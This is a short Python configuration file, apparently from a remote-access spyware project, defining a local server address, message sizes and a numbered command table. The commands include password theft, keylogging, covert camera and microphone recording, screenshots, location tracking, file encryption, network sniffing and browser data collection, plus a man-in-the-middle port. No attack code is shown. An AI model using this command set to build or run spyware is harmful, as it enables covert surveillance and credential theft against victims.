
from enum import Enum

PORT = 8800
IP = "127.0.0.1"
ADDRESS = (IP, PORT)
MAX_SIZE_OF_MSG = 3  # the max length is 10 ^ this number
CHUNK_SIZE = 4  # the real size is 10 ^ this number


SPY_COMMANDS = {
    '1': "get_commands",
    '2': "steal_passwords",
    '3': "start_keylogger",
    '4': "stop_keylogger",
    '5': "start_video_audio_record",
    '6': "start_video_recording",
    '7': "start_audio_recording",
    '8': "stop_video_audio_record",
    '9': "stop_video_recording",
    '10': "stop_audio_recording",
    '11': "get_available_cameras",
    '12': "get_user",
    '13': "get_computer",
    '14': "take_screenshot",
    '15': "get_location",
    '16': "encryption_key",
    '17': "encrypt",
    '18': "decrypt",
    '19': "start_sniffing_to_file",
    '20': "start_sniffing_on_net",
    '21': "stop_sniffing",
    '22': "get_browser_info",
}


OTHER_COMMANDS = {

}


class Massages(Enum):
    SEP = ', '
    EXIT = '0'
    BYE = "Good Bye"
    OK = "OK"
    NOT_OK = "no"
    INVALID_COMMAND = "-1"
    INVALID_NUMBER_OF_PARAMS = "-2"
    INVALID_PARAMS = "-3"
    DEFAULT_PARAM = "-1a5x2dr"


MITM_DEFAULT_PORT = 8564
